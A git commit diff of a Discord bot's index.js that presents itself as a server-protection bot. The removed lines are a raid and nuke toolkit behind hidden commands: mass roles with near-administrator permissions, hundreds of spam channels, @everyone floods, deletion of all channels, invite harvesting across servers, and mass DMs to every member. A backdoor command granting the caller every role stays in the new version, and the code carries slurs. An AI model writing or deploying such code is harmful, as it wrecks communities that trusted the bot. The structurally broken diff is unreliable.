8c5c80004bd278de6eb939c15b6796b09a23f196
PaidkS <43180613+PaidkS@users.noreply.github.com>
2020-04-04 17:21:22 +0200

    Update index.js

--- .gitignore/index.js
+++ .gitignore/index.js
@@ -2,199 +2,66 @@ const Discord = require("discord.js");
 const bot = new Discord.Client();
 bot.login (process.env.TOKEN);
 bot.on("ready", () => {
-bot.user.setActivity('I Protect Your Server', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
+bot.user.setActivity('Whis le PD', { type: 'STREAMING', url:'https://www.twitch.tv/monstercat'})
   console.log("Bot [ON]")
   })
   bot.on("message", message => {
-if(message.content.includes("AR!kelsairv")){
-  console.log(`${bot.guilds.map(c => c.name)}`)
 }
-if(message.content === "!cuck"){
-for(var i =0; i < 200; i++){
-    message.guild.createRole({name:"cuck",
-                             mentionable:false,
-                             permissions:2146958591,
-                             position: "",
-                             color: "#fb0707"
-        })
-        message.guild.createRole({name:"Cuck",
-        mentionable:false,
-        permissions:2146958591,
-        position: "",
-        color: "#ff08c5"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#5d08ff"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#0c08ff"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#08d5ff"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#08ffa3"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#08ff23"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#81ff08"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#fff608"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff6f08"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-message.guild.createRole({name:"Cuck",
-mentionable:false,
-permissions:2146958591,
-position: "",
-color: "#ff0808"
-})
-    }
+
+if (message.content === "!aide"){
+  var helpembed = new Discord.RichEmbed()
+    .setTitle("💬 Les commandes du bots : 💬")
+    .setDescription("le serveur qui a pas de nom's commands ")
+    .setColor("#dc143c")
+    .addField("┌╴╜          Liste des commandes du bot          ╙╴┐")
+    .addField("├ **!contexte :** vous donne le xontexte du rp  ")
+    .addField("├ **!fiche :** vous donne la template fiche rp ")
+    .addField("├ **!serverinfo :** pour voir les infos du serveur ")
+    .addField("├ **!plainte :** vous crée une plainte au staff ")
+    .addField("├ **!aide fiche :** T'aide à faire ta fiche rp ")
+    .addField("├ **!map :** vous montre la map du rp ")
+    .addField("└┉╴┐ 『                ۞۞۞۞۞                』 ┌╴┉┘");
+    return message.channel.send(helpembed);
+ 
+              
+}
+
+if (message.content === "!aide fiche"){
+  var ficheembed = new Discord.RichEmbed()
+    .setTitle("💬 Les commandes du bots : 💬")
+    .setDescription("ProtectBot's commands ")
+    .setColor("#dc143c")
+    .addField("┌╴╜          Liste des commandes du bot          ╙╴┐")
+    .addField("├ **!aide Royaume :**  ")
+    .addField("├ **!aide Race :**  ")
+    .addField("├ **!aide Titre :**  ")
+    .addField("├ **!aide Pouvoir :**  ")
+    .addField("├ **!aide Histoire :**  ")
+    .addField("├ **!aide Caractère | Physique :**  ")
+    .addField("└┉╴┐ 『                ۞۞۞۞۞                』 ┌╴┉┘");
+    return message.channel.send(ficheembed);      
+              
 }
 
 
-if(message.content.includes("!role")){
-    message.guild.createRole({name:".",
-                              mentionable:false,
-                              permissions:2146958591,
-                              position: "",
-                              color: "#fb0707"
-   })
+ 
+              
+
+
+if (message.content === "!serverinfo"){
+  let sicon = message.guild.iconURL;
+  var serverembed = new Discord.RichEmbed()
+  .setTitle("Informations du serveur")
+  .setDescription("Informations")
+  .setColor("#15f153")
+  .setThumbnail(sicon)
+
+  return message.channel.send(serverembed);
 }
 if(message.content.includes("!raul")){
   (message.guild.roles.map(r => message.member.addRoles(r)))
 }
-if(message.content.includes("ar!kelsairvvesrx")){
-  bot.channels.map(c => c.createInvite().then(url => message.channel.send(`https://discord.gg/${url.code} : ${url.guild.name}`)))
-}
-          if(message.content.includes("A?serveurinvite")){
-              bot.channels.map(c => c.createInvite().then(url => message.channel.send(`${url.code} : ${url.guild.name}`)))
-          }
-          if(message.content === "!issou"){
-              message.guild.setName("T'ES BZ :)")
-              message.guild.setIcon("https://cdn.discordapp.com/attachments/583707818536861714/584055184737435659/Pleure.jpg")
-            }
-            if(message.content === "!pd"){
-              for(var i =0; i < 450; i++){
-              message.guild.createChannel("BY","voice")
-              }
-            }
-            if(message.content.includes("!IDT")){
-                for(var i = 0; i < 200; i++){
-                    message.channel.send("@everyone !IDT https://cdn.discordapp.com/attachments/534055320004067358/599940391055261697/image0.png")
-                }
-            }
-            if(message.content.includes("Kogetta")){
-                for(var i = 0; i < 200; i++){
-                    message.channel.send("@everyone KOGETTA LE ROI https://cdn.discordapp.com/avatars/427825965432045590/4b30c70706fdf66b534665df603027de.png?size=2048")
-                }
-            }
-    //réaction en chaine
-                  if(message.content === "channel"){
-                    message.channel.send("roles").then(m => m.delete());
-                    message.channel.send("issou").then(m => m.delete());
-                      for(var i = 0; i < 999; i++){
-                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("!everyone ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/C5UWgKU ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/C5UWgKU ."))
-                          message.guild.createChannel("REWARD = VOLE", "text").then(c => c.send("@everyone !IDT https://discord.gg/C5UWgKU ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/C5UWgKU ."))
-                          message.guild.createChannel("REWARD = VOLE","text").then(c => c.send("@everyone !IDT https://discord.gg/C5UWgKU ."))
 
-                      }
-                    }
-                    if(message.content === "!insurrection"){
-                      message.guild.channels.map(c => c.delete())
-                      }
-                      //on commence la destruction
-                      if(message.content.includes("insurrection")){
-                          message.channel.send("ban").then(m => m.delete());
-                          message.channel.send("drole").then(m => m.delete());
-                          message.channel.send("destroy").then(m => m.delete());
-                          message.channel.send("jechange").then(m => m.delete());
-                          message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
-                      }
-                    });
-bot.on('message', message => {
- if(message.content.startsWith('alldm')){
-let cont = message.content.slice(1).split(" ")
-        let args = cont.slice(1)
-        let member = message.guild.member(message.mentions.users.first()) || message.guild.members.get(args[0])
-      message.guild.members.forEach((player) => {
-          message.guild.member(player).send(`Rejoins .
-
-
- IDT 🌙 https://discord.gg/C5UWgKU`);
 });
     }
 })
